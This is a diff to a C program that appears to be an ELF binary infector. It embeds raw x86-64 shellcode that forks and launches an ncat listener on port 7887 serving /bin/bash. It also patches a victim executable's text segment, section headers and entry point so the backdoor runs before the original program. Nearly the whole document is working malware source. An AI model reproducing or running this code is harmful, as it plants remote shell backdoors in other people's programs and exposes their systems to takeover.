@@ -13,13 +13,15 @@
 #include <sys/mman.h>
 
 
+char payload_shellcode[] = "\x50\x57\x56\x52\x53\xb8\x39\x00\x00\x00\x0f\x05\x48\x8d\x1d\x2f\x00\x00\x00\x48\x8d\x3d\x14\x00\x00\x00\x48\x29\xfb\x48\xf7\xd8\x48\x19\xc0\x48\xff\xc0\x48\xf7\xe3\x48\x01\xf8\xff\xe0\x5b\x5a\x5e\x5f\x58\x48\x8d\x05\xc6\xff\xff\xff\x48\x2d\x11\x11\x11\x11\xff\xe0\xb8\x70\x00\x00\x00\x0f\x05\xb8\x5f\x00\x00\x00\x48\x31\xf6\x0f\x05\xb8\x03\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xb8\x03\x00\x00\x00\xbf\x01\x00\x00\x00\x0f\x05\xb8\x03\x00\x00\x00\xbf\x02\x00\x00\x00\x0f\x05\xb8\x00\x00\x00\x00\x50\x48\x8d\x05\x5a\x00\x00\x00\x50\x48\x8d\x05\x4f\x00\x00\x00\x50\x48\x8d\x05\x42\x00\x00\x00\x50\x48\x8d\x05\x37\x00\x00\x00\x50\x48\x8d\x05\x21\x00\x00\x00\x50\xb8\x3b\x00\x00\x00\x48\x8d\x3d\x14\x00\x00\x00\x48\x89\xe6\x48\x31\xd2\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x6e\x63\x61\x74\x00\x2d\x6c\x00\x37\x38\x38\x37\x00\x2d\x65\x00\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x00";
+
+
 typedef struct {
     Elf64_Ehdr* ehdr;
     Elf64_Phdr* phdr;
     Elf64_Shdr* shdr;
 
     char* file_name;
-
     uint32_t file_size;
     int32_t fd;
 } elf_stat;
@@ -27,7 +29,7 @@ typedef struct {
 
 elf_stat* load_elf(char* file_name) {
     uint32_t file_size;
-    int32_t fd;
+    int32_t fd, read_bytes_count;
     struct stat file_info;
     Elf64_Ehdr* ehdr;
     Elf64_Phdr* phdr;
@@ -45,10 +47,17 @@ elf_stat* load_elf(char* file_name) {
     file_size = file_info.st_size;
 
     ehdr = (Elf64_Ehdr*) mmap(0, file_size,
-                              PROT_READ | PROT_WRITE | PROT_EXEC,
-                              MAP_SHARED, fd, 0);
+               PROT_READ | PROT_WRITE | PROT_EXEC,
+               MAP_SHARED, fd, 0);
     if (ehdr == MAP_FAILED) {
-        fprintf(stderr, "Error on file mapping %s\n", file_name);
+        close(fd);
+        fprintf(stderr, "Error on file %s mapping\n", file_name);
+        exit(1);
+    }
+
+    if (ehdr->e_ident[0] != 0x7f && strcmp(&ehdr->e_ident[1], "ELF")) {
+        close(fd);
+        fprintf(stderr, "File %s is not an elf file\n", file_name);
         exit(1);
     }
 
@@ -104,69 +113,66 @@ int replace_fake_entry_point(char* payload_data, int payload_size, uint32_t fake
 }
 
 
-int prepare_infection(elf_stat* target, elf_stat* payload) {
+int prepare_infection(elf_stat* victim, elf_stat* payload) {
     uint16_t i;
-    uint64_t end_of_text_segment, gap_size, payload_text_size;
-    Elf64_Addr old_entry_point, payload_vaddr;
-    char* payload_text_section;
+    uint64_t end_of_text_segment, gap_size, payload_size;
     char* mem;
+    char* payload_data;
+    Elf64_Addr old_entry_point, payload_vaddr;
     Elf64_Phdr text_segment, data_segment;
 
-    old_entry_point = target->ehdr->e_entry;
+    old_entry_point = victim->ehdr->e_entry;
 
-    printf("old_entry_point %#lx\n", old_entry_point);
-
-    payload_text_section = get_section(payload, ".text", &payload_text_size);
-    if (payload_text_section == NULL) {
-        fprintf(stderr, "Can't find .text section\n");
-        exit(1);
+    if (payload == NULL) {
+        payload_data = payload_shellcode;
+        payload_size = sizeof(payload_shellcode);
+    }
+    else {
+        payload_data = get_section(payload, ".text", &payload_size);
     }
 
-    for (i = 0; i < target->ehdr->e_phnum; i++){
-        if (target->phdr[i].p_type == PT_LOAD && target->phdr[i].p_offset == 0) {
-            text_segment = target->phdr[i];
-            data_segment = target->phdr[i+1];
+    if (payload_data == NULL) {
+        fprintf(stderr, "Can't find .text section\n");
+        return 1;
+    }
 
-            printf("Data segemnt start %lu\n", data_segment.p_offset);
+    for (i = 0; i < victim->ehdr->e_phnum; i++){
+        if (victim->phdr[i].p_type == PT_LOAD && victim->phdr[i].p_offset == 0) {
+            text_segment = victim->phdr[i];
+            data_segment = victim->phdr[i+1];
 
             end_of_text_segment = text_segment.p_offset + text_segment.p_filesz;
-            printf("Text segemnt end %lu\n", end_of_text_segment);
             gap_size = data_segment.p_offset - end_of_text_segment;
-            printf("gap_size = %lu, payload_size = %lu\n", gap_size, payload_text_size);
-            if (gap_size < payload_text_size) {
-                fprintf(stderr, "Payload size too big");
-                exit(1);
+            if (gap_size < payload_size) {
+                fprintf(stderr, "Payload size is too big\n");
+                return 1;
             }
-            printf("Text segment vaddr = %#lx\n", text_segment.p_vaddr);
-            printf("Text segment size = %lu\n", text_segment.p_filesz);
             payload_vaddr = (Elf64_Addr) (text_segment.p_vaddr + end_of_text_segment);
-            printf("new_entry_point %#lx\n", payload_vaddr);
-            target->phdr[i].p_filesz += payload_text_size;
-            target->phdr[i].p_memsz += payload_text_size;
+            victim->phdr[i].p_filesz += payload_size;
+            victim->phdr[i].p_memsz += payload_size;
             break;
         }
     }
 
-    for (i = 0; i < target->ehdr->e_shnum; i++){
-        if (target->shdr[i].sh_offset + target->shdr[i].sh_size == end_of_text_segment) {
-            printf("Shdr %d\n", i);
-            target->shdr[i].sh_size += payload_text_size;
-            target->shdr[i].sh_flags |= SHF_EXECINSTR;
+    for (i = 0; i < victim->ehdr->e_shnum; i++){
+        if (victim->shdr[i].sh_offset + victim->shdr[i].sh_size == end_of_text_segment) {
+            victim->shdr[i].sh_size += payload_size;
+            victim->shdr[i].sh_flags |= SHF_EXECINSTR;
         }
     }
 
-    int res = replace_fake_entry_point(payload_text_section, payload_text_size, (uint32_t) 0x11111111, (uint32_t) (end_of_text_segment - old_entry_point));
+    int res = replace_fake_entry_point(payload_data, payload_size, (uint32_t) 0x11111111, (uint32_t) (end_of_text_segment - old_entry_point));
     if (res == -1) {
         fprintf(stderr, "Cant find replace point\n");
-        exit(1);
+        return 1;
     }
 
-    target->ehdr->e_entry = payload_vaddr;
-    mem = (char*) target->ehdr;
-    memcpy(mem + end_of_text_segment, payload_text_section, payload_text_size);
+    victim->ehdr->e_entry = payload_vaddr;
+    mem = (char*) victim->ehdr;
+    memcpy(mem + end_of_text_segment, payload_data, payload_size);
 
-    if (payload_text_section != NULL) {
-       free(payload_text_section);
+    if (payload_data != NULL && payload != NULL) {
+       free(payload_data);
     }
 
     return 0;
@@ -184,21 +190,26 @@ int clean_elf_stat(elf_stat* stat) {
 
 
 int main(int argc, char* argv[]) {
-    elf_stat* target_elf_stat;
+    elf_stat* victim_elf_stat;
     elf_stat* payload_elf_stat;
+    const char* section_name;
 
-    if (argc != 3) {
-        fprintf(stderr, "Usage: %s target payload\n", argv[0]);
+    if (argc == 2) {
+        victim_elf_stat = load_elf(argv[1]);
+        prepare_infection(victim_elf_stat, NULL);
+    }
+    else if (argc == 3) {
+        victim_elf_stat = load_elf(argv[1]);
+        payload_elf_stat = load_elf(argv[2]);
+        prepare_infection(victim_elf_stat, payload_elf_stat);
+        clean_elf_stat(payload_elf_stat);
+    }
+    else {
+        fprintf(stderr, "Usage: %s victim [payload]\n", argv[0]);
         exit(1);
     }
 
-    target_elf_stat = load_elf(argv[1]);
-    payload_elf_stat = load_elf(argv[2]);
-
-    prepare_infection(target_elf_stat, payload_elf_stat);
-
-    clean_elf_stat(target_elf_stat);
-    clean_elf_stat(payload_elf_stat);
+    clean_elf_stat(victim_elf_stat);
 
     return 0;
 }
